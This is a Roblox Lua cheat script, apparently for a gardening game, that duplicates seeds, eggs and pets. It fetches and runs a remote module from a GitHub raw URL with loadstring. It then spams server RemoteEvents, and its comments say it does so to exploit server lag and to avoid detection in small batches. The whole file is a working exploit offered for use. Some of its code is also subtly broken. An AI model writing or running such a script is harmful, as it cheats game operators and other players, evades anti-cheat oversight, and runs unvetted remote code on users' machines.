local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Attempt to load Spawner module with robust error handling
local Spawner = nil
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))()
end)
if success and type(result) =="table" then
    Spawner = result
    print("Spawner module loaded successfully.")
else
    print("Failed to load Spawner module. Using fallback logic.")
    Spawner = {}
end

-- Fallback RemoteEvent finder
local function FindRemote(name)
    local remote = ReplicatedStorage:FindFirstChild(name)
    if remote then
        return remote
    end
    for_, v in pairs(ReplicatedStorage:GetDescendants()) do
        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) and string.find(v.Name:lower(), name:lower()) then
            return v
        end
    end
    print("No RemoteEvent found for" .. name .. ".")
    return nil
end

-- Fallback spawning functions
Spawner.SpawnPet = Spawner.SpawnPet or function(petName, weight, age)
    local remote = FindRemote("SpawnPet") or FindRemote("Pet")
    if remote then
        remote:FireServer(petName, weight or 1, age or 1)
    else
        print("Cannot spawn Pet: No RemoteEvent found.")
    end
end

Spawner.SpawnSeed = Spawner.SpawnSeed or function(seedName)
    local remote = FindRemote("SpawnSeed") or FindRemote("Seed")
    if remote then
        remote:FireServer(seedName)
    else
        print("Cannot spawn Seed: No RemoteEvent found.")
    end
end

Spawner.SpawnEgg = Spawner.SpawnEgg or function(eggName)
    local remote = FindRemote("SpawnEgg") or FindRemote("Egg")
    if remote then
        remote:FireServer(eggName)
    else
        print("Cannot spawn Egg: No RemoteEvent found.")
    end
end

Spawner.GetPets = Spawner.GetPets or function()
    return {"Raccoon","Fox","Bunny"} -- Adjust based on game
end

Spawner.GetSeeds = Spawner.GetSeeds or function()
    return {"Candy Blossom","Sunflower","Moonflower"} -- Adjust based on game
end

Spawner.Spin = Spawner.Spin or function(itemName)
    local remote = FindRemote("Spin") or FindRemote("Action")
    if remote then
        remote:FireServer(itemName)
    else
        print("Cannot spin: No RemoteEvent found.")
    end
end

-- Function to spam spawn requests for duplication
local function DupeItem(itemType, itemName, count, ...)
    local args = {...}
    for i = 1, count do
        local success, err = pcall(function()
            if itemType =="Pet" and type(Spawner.SpawnPet) =="function" then
                Spawner.SpawnPet(itemName, args[1] or 1, args[2] or 1)
            elseif itemType =="Seed" and type(Spawner.SpawnSeed) =="function" then
                Spawner.SpawnSeed(itemName)
            elseif itemType =="Egg" and type(Spawner.SpawnEgg) =="function" then
                Spawner.SpawnEgg(itemName)
            else
                print("Invalid function for" .. itemType .. ".")
            end
        end)
        if not success then
            print("Error spawning" .. itemType .. ":" .. err)
        end
        wait(0.02) -- Tighter delay to exploit server lag
    end
end

-- Function to check GUI inventory
local function CheckInventory()
    local inventory = {}
    local success, result = pcall(function()
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        local guis = {"Inventory","MainGui","GameGui","ScreenGui"} -- Common GUI names
        local inventoryGui = nil
        for_, guiName in pairs(guis) do
            inventoryGui = playerGui:FindFirstChild(guiName)
            if inventoryGui then break end
        end
        if inventoryGui then
            for_, item in pairs(inventoryGui:GetDescendants()) do
                if item:IsA("TextLabel") or item:IsA("ImageLabel") or item:IsA("Frame") then
                    local itemName = item.Name or (item:FindFirstChild("ItemName") and item.ItemName.Text) or item.Text
                    if itemName and itemName ~= "" then
                        table.insert(inventory, itemName)
                    end
                end
            end
        end
        return inventory
    end)
    if success and #inventory > 0 then
        print("GUI Inventory Contents:" .. table.concat(inventory,", "))
    else
        print("Failed to access GUI inventory or it's empty. Try planting a seed or relogging.")
    end
end

-- Function to list supported items
local function ListSupportedItems()
    local pets = Spawner.GetPets and type(Spawner.GetPets) =="function" and Spawner.GetPets() or {"Raccoon","Fox","Bunny"}
    local seeds = Spawner.GetSeeds and type(Spawner.GetSeeds) =="function" and Spawner.GetSeeds() or {"Candy Blossom","Sunflower","Moonflower"}
    print("Supported Pets:" .. table.concat(pets,", "))
    print("Supported Seeds:" .. table.concat(seeds,", "))
end

-- Spawner function for continuous duplication
local function AutoSpawner(itemType, itemName, interval, maxItems, ...)
    local spawned = 0
    while spawned < maxItems do
        DupeItem(itemType, itemName, 2) -- Smaller batches to avoid detection
        spawned = spawned + 2
        CheckInventory() -- Check GUI after each batch
        print("Spawned" .. spawned .. "" .. itemName .. "(s).")
        wait(interval)
    end
    print("AutoSpawner finished for" .. itemName .. ".")
end

-- Force server update
local function TriggerSpin()
    if type(Spawner.Spin) =="function" then
        Spawner.Spin("Sunflower")
        print("Spun Sunflower to force server update.")
    else
        print("Spin function invalid. Skipping.")
    end
end

-- Main execution
local function Main()
    ListSupportedItems() -- Show what we can dupe
    DupeItem("Seed","Candy Blossom", 5) -- Start with 5 seeds
    DupeItem("Egg","Night Egg", 5) -- Start with 5 eggs
    CheckInventory() -- Check GUI
    TriggerSpin() -- Force server sync
    spawn(function()
        AutoSpawner("Seed","Candy Blossom", 1, 30) -- 30 seeds, 2 every 1s
        AutoSpawner("Egg","Night Egg", 1, 30) -- 30 eggs, 2 every 1s
    end)
    print("Duplication and spawner running. Monitor your GUI inventory.")
end

local success, err = pcall(Main)
if not success then
    print("Error in Main:" .. err)
end